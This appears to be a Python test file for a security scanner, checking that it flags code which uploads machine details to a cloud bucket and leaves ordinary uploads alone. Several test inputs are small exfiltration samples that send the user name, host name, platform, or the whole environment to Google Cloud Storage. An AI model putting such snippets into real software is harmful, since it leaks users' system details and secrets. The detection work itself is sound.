"""What the machine knows, put in a cloud store (`flows/implants/cloud_leak.py`).

Every source is assembled for the test and only parsed. The twins upload files or data the program
made, and read the bucket's name from the environment."""

from __future__ import annotations

from cordon_scanner.analysis.python.pyast import PythonAnalyzer


class Kit:
    @staticmethod
    def leaked(source: str) -> list[str]:
        return [h.detail for h in PythonAnalyzer.analyse(source) if h.detail == "machine facts uploaded"]


class TestMachineFactsInABucket:
    def test_environment_values_uploaded_from_a_thread(self) -> None:
        source = (
            "import os, threading\n"
            "from google.cloud import storage\n"
            "def leak_data():\n"
            "    user = os.getenv('USER')\n"
            "    host = os.getenv('HOSTNAME')\n"
            "    blob = storage.Client().bucket('b').blob('k')\n"
            "    blob.upload_from_string(f'{user} {host}')\n"
            "threading.Thread(target=leak_data).start()\n"
        )
        assert Kit.leaked(source) == ["machine facts uploaded"]

    def test_the_host_and_platform_put_in_a_blob(self) -> None:
        source = (
            "import platform, socket\n"
            "from google.cloud import storage\n"
            "def beacon():\n"
            "    blob = storage.Client().bucket('b').blob('k')\n"
            "    blob.upload_from_string(socket.gethostname() + platform.system())\n"
        )
        assert Kit.leaked(source) == ["machine facts uploaded"]


class TestOrdinaryUploads:
    def test_a_file_the_user_named(self) -> None:
        source = (
            "import boto3\n"
            "def upload(path, key):\n"
            "    boto3.client('s3').upload_file(path, 'b', key)\n"
        )
        assert Kit.leaked(source) == []

    def test_the_bucket_name_from_the_environment_is_not_the_payload(self) -> None:
        source = (
            "import os\n"
            "from google.cloud import storage\n"
            "def put(text):\n"
            "    bucket = storage.Client().bucket(os.environ['BUCKET'])\n"
            "    bucket.blob('k').upload_from_string(text)\n"
        )
        assert Kit.leaked(source) == []

    def test_a_setting_read_from_the_environment_in_the_key_not_the_body(self) -> None:
        source = (
            "import os\n"
            "import boto3\n"
            "def put(data):\n"
            "    prefix = os.environ.get('S3_PREFIX', '')\n"
            "    boto3.client('s3').put_object(Bucket='b', Key=prefix + 'k', Body=data)\n"
        )
        assert Kit.leaked(source) == []

    def test_the_whole_environment_uploaded(self) -> None:
        source = (
            "import os\n"
            "from google.cloud import storage\n"
            "def go():\n"
            "    storage.Client().bucket('b').blob('k').upload_from_string(str(dict(os.environ)))\n"
        )
        assert Kit.leaked(source) == ["machine facts uploaded"]

    def test_no_cloud_library_in_the_file(self) -> None:
        source = "import os\ndef go(store):\n    store.upload_from_string(os.getenv('USER'))\n"
        assert Kit.leaked(source) == []
